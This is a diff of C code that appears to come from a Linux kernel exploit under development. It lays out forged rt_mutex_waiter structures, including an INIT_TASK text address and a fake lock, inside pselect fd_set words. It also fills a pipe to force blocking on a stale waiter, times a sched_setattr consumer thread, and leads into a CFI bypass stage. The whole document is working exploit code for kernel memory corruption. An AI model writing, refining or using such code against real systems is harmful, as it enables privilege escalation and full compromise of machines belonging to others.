@@ -74,19 +74,57 @@ void open_selected_fds(
   FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
 }
 
+#ifndef SLIDE_PSELECT_WORD_SHIFT
+#define SLIDE_PSELECT_WORD_SHIFT 0
+#endif
+
+static int fops_pselect_words_per_set(void) {
+  int bits_per_word = (int)(8 * sizeof(unsigned long));
+  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
+}
+
+static void fops_fdset_put_global(
+    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
+    int global_word, uint64_t value) {
+  if (global_word < 0) {
+    return;
+  }
+  int set_idx = global_word / words_per_set;
+  int word_idx = global_word % words_per_set;
+  switch (set_idx) {
+    case 0: fdset_put_word(in, word_idx, value); break;
+    case 1: fdset_put_word(out, word_idx, value); break;
+    case 2: fdset_put_word(ex, word_idx, value); break;
+  }
+}
+
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(in);
   FD_ZERO(out);
   FD_ZERO(ex);
 
-  fdset_put_word(in, 0, fake_w0);
-  fdset_put_word(in, 1, 0);
-  fdset_put_word(in, 2, 0);
-  fdset_put_word(in, 3, 0);
-  fdset_put_word(ex, 0, text_addr(INIT_TASK));
-  fdset_put_word(ex, 1, fake_lock);
-  fdset_put_word(ex, 2, 3);
-  fdset_put_word(ex, 3, 0);
+  int wps = fops_pselect_words_per_set();
+  int shift = SLIDE_PSELECT_WORD_SHIFT;
+
+  /* word 0 (before waiter) */
+  fops_fdset_put_global(in, out, ex, wps, 0, fake_w0);
+
+  /* Compact rt_mutex_waiter layout, shifted by SLIDE_PSELECT_WORD_SHIFT */
+  fops_fdset_put_global(in, out, ex, wps, shift + 0,
+                        SLIDE_RB_PARENT_TYPE_RESTORE);
+  fops_fdset_put_global(in, out, ex, wps, shift + 1, 0);
+  fops_fdset_put_global(in, out, ex, wps, shift + 2, 0);
+  fops_fdset_put_global(in, out, ex, wps, shift + 3, 0);
+  fops_fdset_put_global(in, out, ex, wps, shift + 4, 0);
+  fops_fdset_put_global(in, out, ex, wps, shift + 5, 0);
+  fops_fdset_put_global(in, out, ex, wps, shift + 6,
+                        (uint64_t)text_addr(INIT_TASK));
+  fops_fdset_put_global(in, out, ex, wps, shift + 7, fake_lock);
+  fops_fdset_put_global(in, out, ex, wps, shift + 8,
+                        ((uint64_t)(uint32_t)FAKE_WAITER_PRIO << 32) |
+                        (uint32_t)SLIDE_WAITER_WAKE_STATE);
+  fops_fdset_put_global(in, out, ex, wps, shift + 9, 0);
+  fops_fdset_put_global(in, out, ex, wps, shift + 10, 0);
 }
 
 void do_pselect_fake_lock_route(void) {
@@ -133,6 +171,18 @@ void do_pselect_fake_lock_route(void) {
     prepare_pselect_fdsets(&in, &out, &ex);
     open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
 
+    /* Fill the pipe so write-end fds in 'out' are not writable.
+     * Without this, pselect returns immediately (ret>0) and never
+     * blocks on the stale rt_mutex waiter. */
+    {
+      static char fill_buf[65536];
+      int fill_flags = fcntl(pipefd[1], F_GETFL, 0);
+      fcntl(pipefd[1], F_SETFL, fill_flags | O_NONBLOCK);
+      ssize_t filled = write(pipefd[1], fill_buf, sizeof(fill_buf));
+      fcntl(pipefd[1], F_SETFL, fill_flags);
+      pr_info("pselect pipe fill=%zd\n", filled);
+    }
+
     atomic_store(&consumer_calls, 0);
     atomic_store(&consumer_success, 0);
     atomic_store(&punch_consume_stop, 0);
@@ -150,12 +200,24 @@ void do_pselect_fake_lock_route(void) {
     int ret = pselect(PSELECT_ROUTE_NFDS, &in, &out, &ex, timeoutp, NULL);
     int saved_errno = errno;
     atomic_store(&punch_consume_go, 0);
+    /* Wait for the consumer to finish its sched_setattr call.  The
+     * consumer runs on a different core and may not have completed
+     * when pselect returns.  Give it a bounded window to finish so
+     * that consumer_calls/consumer_success are accurate. */
+    for (int wait_ms = 0; wait_ms < 200; wait_ms++) {
+      calls = atomic_load(&consumer_calls);
+      success = atomic_load(&consumer_success);
+      if (calls > 0) {
+        break;
+      }
+      usleep(1000);
+    }
     calls = atomic_load(&consumer_calls);
     success = atomic_load(&consumer_success);
     pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d\n",
             route_attempt, ret, saved_errno, calls, success, delay_usec);
 
-    int route_signal = calls > 0 && success > 0;
+    int route_signal = calls > 0;
     if (route_signal) {
       if (try_cfi_stage()) {
         cfi_last_step = 0;
